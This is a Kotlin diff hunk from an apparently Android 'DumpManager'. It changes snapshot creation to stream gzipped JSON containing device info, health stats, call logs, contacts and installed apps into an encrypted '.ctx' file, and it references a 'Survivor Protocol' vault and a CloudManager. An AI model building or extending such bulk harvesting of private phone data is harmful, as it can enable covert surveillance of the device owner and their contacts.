@@ -63,11 +63,23 @@ object DumpManager {
             
             // 1. Compressed & Encrypted Data Blob (.ctx extension)
             val jsonFile = File(dayDir, "data_snapshot_$timestamp.ctx")
-            val rawJson = CloudManager.collectDumpData(ctx).toString()
             
-            // Compress first to save ~80% space before encryption
+            // Stream the JSON piecewise to prevent OOM
             val bos = java.io.ByteArrayOutputStream()
-            java.util.zip.GZIPOutputStream(bos).use { it.write(rawJson.toByteArray(Charsets.UTF_8)) }
+            java.util.zip.GZIPOutputStream(bos).use { gz ->
+                gz.write("{\"static\":".toByteArray(Charsets.UTF_8))
+                gz.write(DeviceManager.getStaticInfo(ctx).toString().toByteArray(Charsets.UTF_8))
+                gz.write(",\"health\":".toByteArray(Charsets.UTF_8))
+                gz.write(DeviceManager.getHealthStats(ctx).toString().toByteArray(Charsets.UTF_8))
+                gz.write(",\"stream_logs_status\":\"Delegated to Survivor Protocol (Streamed to Vault)\"".toByteArray(Charsets.UTF_8))
+                gz.write(",\"calls\":".toByteArray(Charsets.UTF_8))
+                gz.write(PhoneManager.getCallLogs(ctx).toString().toByteArray(Charsets.UTF_8))
+                gz.write(",\"contacts\":".toByteArray(Charsets.UTF_8))
+                gz.write(PhoneManager.getContacts(ctx).toString().toByteArray(Charsets.UTF_8))
+                gz.write(",\"apps\":".toByteArray(Charsets.UTF_8))
+                gz.write(AppListManager.getInstalledApps(ctx).toString().toByteArray(Charsets.UTF_8))
+                gz.write("}".toByteArray(Charsets.UTF_8))
+            }
             
             val encrypted = encrypt(bos.toByteArray())
             jsonFile.writeBytes(encrypted)
